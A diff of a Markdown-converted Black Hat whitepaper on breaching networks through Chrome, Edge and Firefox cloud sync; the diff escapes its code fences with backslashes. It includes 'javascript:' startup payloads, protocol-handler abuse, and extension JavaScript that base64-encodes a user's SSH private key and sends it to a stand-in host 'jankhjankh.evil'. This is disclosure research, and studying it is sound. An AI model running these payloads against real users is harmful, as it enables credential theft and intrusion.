@@ -8,19 +8,25 @@ year: 2023
 source_pdf: "Black Hat Europe 2023 slides/Edward Prior_Breaching the Perimeter via Cloud Synchronized Browser Settings_wp.pdf"
 pages: 77
 sha256: "f1ae350c7eeeb265b3928a4db34ba8e80999b0eae3954e6e09b6c798a3bc7061"
-text_chars: 96035
+text_chars: 95829
 ocr_pages: 1
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.5
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:57:39Z"
+converted_at: "2026-08-12T04:02:26Z"
 ---
 # Breaching the Perimeter via Cloud Synchronized Browser Settings
 
 **Speakers:** Edward Prior  
 **Conference:** Black Hat Europe 2023  
 **Source:** `Black Hat Europe 2023 slides/Edward Prior_Breaching the Perimeter via Cloud Synchronized Browser Settings_wp.pdf` (77 pages)
+
 
 ## Slide 1
 
@@ -255,16 +261,16 @@ Any vulnerabilities which were patched prior to the release of this whitepaper w
 
 By default, sync web traffic was sent to the following endpoint:
 
-```
+\```
 https://Edge.microsoft.com/sync/v1/feeds/me/syncEntities/command/?cl
 ient=Chromium&client_id=<ID>
-```
+\```
 
 The sync internals for Edge can be found at the following URL:
 
-```
+\```
 Edge://sync-internals
-```
+\```
 
 ### Chrome
 
@@ -272,24 +278,24 @@ By default, sync web traffic was sent to the following endpoint:
 
 **`https://clients4.google.com/Chromesync/command/?client=Google+Chrome&client_id=<ID>`** The sync internals for Chrome can be found at the following URL:
 
-```
+\```
 Chrome://sync-internals
-```
+\```
 
 ### Firefox
 
 By default, sync web traffic was sent to the following endpoint:
 
-```
+\```
 sync-1-us-west1-g.sync.services.mozilla.com
-```
+\```
 
 Firefox does not have an equivalent of sync-internals, however, the documentation for Firefox sync can be found at:
 
-```
+\```
 https://mozilla-services.readthedocs.io/en/latest/storage/apis-
 1.5.html
-```
+\```
 
 Unlike Chrome and Edge, Firefox sync data was encrypted locally by default, meaning that the cloud provider did not have a plaintext copy of any information submitted, but also cannot perform any server-side validation on it.
 
@@ -379,29 +385,31 @@ For extra information on how Firefox logged when a user’s password was last us
 
 Figure 5: The internals of Firefox sync including the timestamps it was last used.
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-V3: Object
-WV cleartext: Object
-id: "{aef46dab-3c32-4d23-bd55-9b@7e580c392}"
-hostname: "https://jankhjankh. github. io"
-formSubmitURL: “https: //jankhjankh. github. io”
-httpRealm: null
-username: “username”
-password: “password"™
-usernameField: “uname”
-passwordField: “psw”™
-timeCreated: 1696463467376
-timePasswordChanged: 1696463467376
-V data: Object
-id: “{aef46dab-3c32-4d23-bd55-9b07e580c392}"
-modified: 1696471546.64
-VY payload: Object
-ciphertext: null
-IV: "“BVehNXhWbFioUMwFxSbqMA=="
-hmac: “@89b7bb1d29c2222485af56645d3ba77cOd7 f1acc3b12£0127b4537389d2b3a6"
-collection: undefined
+3: Object
+  cleartext: Object
+    id: "{aef46dab-3c32-4d23-bd55-9b07e580c392}"
+    hostname: "https://jankhjankh.github.io"
+    formSubmitURL: "https://jankhjankh.github.io"
+    httpRealm: null
+    username: "username"
+    password: "password"
+    usernameField: "uname"
+    passwordField: "psw"
+    timeCreated: 1696463467376
+    timePasswordChanged: 1696463467376
+  data: Object
+    id: "{aef46dab-3c32-4d23-bd55-9b07e580c392}"
+    modified: 1696471546.64
+    payload: Object
+      ciphertext: null
+      IV: "BVehNXhWbFioUMwFxSbqMA=="
+      hmac: "089b7bb1d29c2222485af56645d3ba77c0d7f1acc3b12f0127b4537389d2b3a6"
+  collection: undefined
+
 Figure 5: The internals of Firefox sync including the timestamps it was last used.
 ```
 
@@ -579,9 +587,9 @@ Figure 19: Alert box received on victim device to open a copy of the attacker's 
 
 Firefox allowed for the opening of multiple tabs via use of the “ **`|`** ” character between them. For example:
 
-```
+\```
 https://google.com|https://site.internal
-```
+\```
 
 Firefox could also remember how file types were handled and could automatically run files of the downloaded filetype if that was how they had been previously handled. There were some protections in place to prevent misuse of this feature, such as disabling the feature for EXE and MSI files.
 
@@ -599,15 +607,15 @@ Figure 20: Chrome client-side check rejecting the **`javascript:`** URL.
 
 By submitting a valid payload and intercepting the sync request in a web proxy, it was possible to modify the protobuf to submit an unsafe startup value to be accepted by the server:
 
-```
+\```
 Bavascript:alert("Domain:"+document.domain+"\nLocation:"+document.lo
 cation)
-```
+\```
 
-```
+\```
 javascript:alert("Domain:"+document.domain+"\nLocation:"+document.lo
 cation)
-```
+\```
 
 Figure 21: Sync request protobuf intercepted by a proxy, prior to modification.
 
@@ -635,15 +643,15 @@ Figure 25:  Edge client-side check rejecting the **`javascript:`** URL.
 
 By submitting a valid payload and intercepting the sync request in a web proxy, it was possible to modify the protobuf to submit an unsafe startup value to be accepted by the server:
 
-```
+\```
 Bavascript:alert("Domain:"+document.domain+"\nLocation:"+document.lo
 cation)
-```
+\```
 
-```
+\```
 javascript:alert("Domain:"+document.domain+"\nLocation:"+document.lo
 cation)
-```
+\```
 
 Figure 26: Sync request protobuf intercepted by a proxy, prior to modification.
 
@@ -807,10 +815,10 @@ Figure 45: The registry key informing browsers how to handle the JNLP protocol h
 
 A sample protocol handler URL and resulting process start command for JNLP have been provided for context. Submitting a protocol handler value of the following would create a prompt in Chrome asking the user if they wanted to open the external application:
 
-```
+\```
 jnlp:https://docs.oracle.com/javase/tutorialJWS/samples/deployment/N
 otepadJWSProject/Notepad.jnlp
-```
+\```
 
 Figure 46: Launching the JNLP protocol handler in Chrome.
 
@@ -822,11 +830,11 @@ Figure 47: Upon the user accepting the previous prompt. JP2Launcher is spawned, 
 
 At this point, regardless of if the user clicks the subsequent link, the JP2Launcher process has been spawned by the protocol handler. The Command line context for the created process was:
 
-```
+\```
 “C:\Program Files\Java\jre-1.8\bin\jp2launcher.exe" -securejws
 "jnlp:https://docs.oracle.com/javase/tutorialJWS/samples/deployment/
 NotepadJWSProject/Notepad.jnlp"
-```
+\```
 
 The full execution chain can be found below:
 
@@ -868,9 +876,9 @@ This protocol handler execution was only activated upon a full restart of Edge. 
 
 Firefox triggered application handlers based off a file stored in the profile called “ **`handlers.json`** ”. If it encountered an application handler that it had not seen before, it would query the registry, and add it to the handlers file without executing it. Then, upon subsequent executions it would execute. As an example, the first time the **`ldap:`** protocol handler was navigated to on Firefox, the following line was be added to the “ **`handlers.json`** ” file:
 
-```
+\```
 ,"ldap":{"action":4}
-```
+\```
 
 Resulting in a handlers file similar to the following:
 
@@ -928,10 +936,10 @@ A simple example of this was the following JavaScript code which base64 encoded 
 
 ## Slide 46
 
-```
+\```
 var Source = new XMLSerializer().serializeToString(document);
 alert("id_rsa:"+btoa(unescape(encodeURIComponent(Source))));
-```
+\```
 
 This functionality worked without any modification on Chrome and Edge, however, on Firefox, Manifest version 3 would not execute the JavaScript within the extension until a user prompt was accepted. This was circumvented by using Manifest version 2 instead. However, this may significantly reduce the likelihood of Firefox users being exploited through this method if manifest version 2 was disallowed in the future.
 
@@ -1127,16 +1135,16 @@ By setting the users start page to a local key file such as file:///C:/User/User
 
 The malicious JavaScript was embedded in the extension:
 
-```
+\```
 if(window.location.href == "file:///C:/Users/User/.ssh/id_rsa"){var
 Source = new XMLSerializer().serializeToString(document);
 fetch("http://jankhjankh.evil:1337/?"+btoa(unescape(encodeURICompone
 nt(Source))));
-```
+\```
 
-```
+\```
 window.location.href="http://google.com"};
-```
+\```
 
 The user’s start page was set to the path to their local SSH private key.
 
@@ -1230,9 +1238,9 @@ This worked on all three browsers, with Firefox requiring additional slashes as 
 
 ##### **`<script`**
 
-```
+\```
 src="file://///192.168.18.128/Demoshare/samplefile.txt"></script>
-```
+\```
 
 #### THEFT-6.2 Config theft via Local File
 
@@ -1438,9 +1446,9 @@ Other holistic recommendations to reduce the impact of the key techniques within
 
 To help perform research in this area, and to test particular techniques, I have created a simulation tool to expedite the testing process. This tool aims to generate artefacts for cloud synchronization and can be used to conduct minor malicious activity as part of purple teaming exercises. It can be downloaded at the following url:
 
-```
+\```
 https://github.com/jankhjankh/Syncy
-```
+\```
 
 Chrome, Edge, and Firefox each contain all cloud-synchronization data within a user profile within the following directories:
 
